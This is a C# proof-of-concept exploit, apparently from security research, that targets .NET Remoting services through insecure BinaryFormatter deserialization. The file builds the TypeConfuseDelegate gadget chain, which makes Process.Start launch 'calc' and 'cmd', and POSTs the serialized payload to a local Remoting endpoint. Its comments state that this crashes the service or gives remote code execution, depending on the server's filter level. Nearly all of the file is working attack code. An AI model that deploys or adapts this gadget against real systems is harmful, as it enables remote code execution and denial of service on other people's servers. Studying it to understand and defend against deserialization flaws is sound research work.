using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Linq.Expressions;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Net.Http;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Reflection;
using System.ComponentModel.Design;
using System.Web.UI.WebControls;
using System.Diagnostics;
using System.IO;
using System.Data;
using System.Configuration;
using System.Runtime.Remoting.Messaging;
using System.CodeDom.Compiler;

namespace RemotingExploit
{
    //Nils Ole Timm of modzero GmbH 2020
    class Program
    {
        static void Main(string[] args)
        {
            //Serialize payload to MemoryStream
            MemoryStream mem = new MemoryStream();
            BinaryFormatter formatter = new BinaryFormatter();
            formatter.Serialize(mem, GeneratePayload());
            mem.Position = 0;

            //Create HttpClient and send Post request with appropriate
            //Content-Type and the payload as content
            HttpClient client = new HttpClient();
            ByteArrayContent content = new ByteArrayContent(mem.ToArray());
            content.Headers.Add("Content-Type", "application/octet-stream");
            var task = client.PostAsync("http://localhost:8001/Service", content);

            //Wait for server response
            //DOS should crash here
            task.Wait();

            //Receive server response
            var task2 = task.Result.Content.ReadAsStringAsync();
            task2.Wait();

            //Print Server response
            Console.WriteLine(task2.Result);
            Console.ReadLine();
        }

        //Standard TypeConfuseDelegate gadget with SortedSet`1
        //Triggers delegate execution on deserialization
        //Causes DOS with TypeFilterLevel.Low and RCE with TypeFilterLevel.Full
        //Denial of Service is triggered by Security Exception in unhandled context

        //More info at https://googleprojectzero.blogspot.com/2017/04/
        static object GeneratePayload()
        {
            Comparison<string> c = new Comparison<string>(string.Compare);
            var c2 = Func<string, string, int>.Combine(c, c);
            TypeConfuseDelegate(c2, new Func<string, string, Process>(Process.Start));
            Comparison<string> c3 = (Comparison<string>)c2;
            SortedSet<string> s = new SortedSet<string>(new string[] { "calc", "cmd" });
            FieldInfo fi = typeof(SortedSet<string>).GetField("comparer",
                BindingFlags.NonPublic | BindingFlags.Instance);
            fi.SetValue(s, Comparer<string>.Create(c3));
            return s;
        }

        //Runtime aware TypeConfuseDelegate Gadget
        static void TypeConfuseDelegate(Delegate handler, Delegate target)
        {
            FieldInfo fi;
            if (IsRunningOnMono())
                fi = typeof(MulticastDelegate).GetField("delegates",
                    BindingFlags.NonPublic | BindingFlags.Instance);
            else
                fi = typeof(MulticastDelegate).GetField("_invocationList",
                    BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = handler.GetInvocationList();
            if (IsRunningOnMono())
                invoke_list[0] = target;
            invoke_list[1] = target;
            fi.SetValue(handler, invoke_list);
        }

        public static bool IsRunningOnMono()
        {
            return Type.GetType("Mono.Runtime") != null;
        }
    }
}
